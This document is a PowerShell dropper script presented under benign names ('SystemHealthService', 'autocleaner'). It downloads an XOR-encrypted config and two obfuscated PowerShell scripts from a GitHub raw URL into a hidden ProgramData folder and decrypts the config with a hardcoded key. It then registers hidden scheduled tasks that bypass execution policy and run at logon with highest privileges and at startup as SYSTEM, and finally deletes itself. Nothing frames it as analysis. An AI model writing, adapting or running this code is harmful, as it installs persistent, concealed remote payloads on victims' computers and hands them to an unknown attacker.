$ErrorActionPreference="SilentlyContinue";$ProgressPreference="SilentlyContinue"
$p="C:\ProgramData\SystemHealthService";$ek="S3cr3tK3y2024!"
$eu="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc"
$uu="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor_obf.ps1"
$au="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitorAdmin_obf.ps1"
if(!(Test-Path $p)){New-Item -Path $p -ItemType Directory -Force|Out-Null};(Get-Item $p).Attributes="Hidden"
Invoke-WebRequest -Uri $eu -OutFile "$p\config.enc" -UseBasicParsing
Invoke-WebRequest -Uri $uu -OutFile "$p\HealthMonitor.ps1" -UseBasicParsing
Invoke-WebRequest -Uri $au -OutFile "$p\HealthMonitorAdmin.ps1" -UseBasicParsing
$enc=[Convert]::FromBase64String((Get-Content "$p\config.enc" -Raw));$kb=[System.Text.Encoding]::UTF8.GetBytes($ek);$dec=New-Object byte[] $enc.Length;for($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor $kb[$i % $kb.Length]};[System.Text.Encoding]::UTF8.GetString($dec)|Out-File "$p\config.json" -Force
Remove-Item "$p\config.enc" -Force
(Get-Item "$p\config.json").Attributes="Hidden";(Get-Item "$p\HealthMonitor.ps1").Attributes="Hidden";(Get-Item "$p\HealthMonitorAdmin.ps1").Attributes="Hidden"
try{schtasks /delete /tn "SystemHealthMonitor" /f 2>$null}catch{};try{schtasks /delete /tn "SystemHealthAdmin" /f 2>$null}catch{}
$un=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$ua=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p\HealthMonitor.ps1`""
$ut=New-ScheduledTaskTrigger -AtLogOn
$us=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)
$up=New-ScheduledTaskPrincipal -UserId $un -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName "SystemHealthMonitor" -Action $ua -Trigger $ut -Settings $us -Principal $up -Force|Out-Null
$aa=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p\HealthMonitorAdmin.ps1`""
$at=New-ScheduledTaskTrigger -AtStartup
$as=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)
$ap=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "SystemHealthAdmin" -Action $aa -Trigger $at -Settings $as -Principal $ap -Force|Out-Null
Start-ScheduledTask -TaskName "SystemHealthMonitor";Start-ScheduledTask -TaskName "SystemHealthAdmin"
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
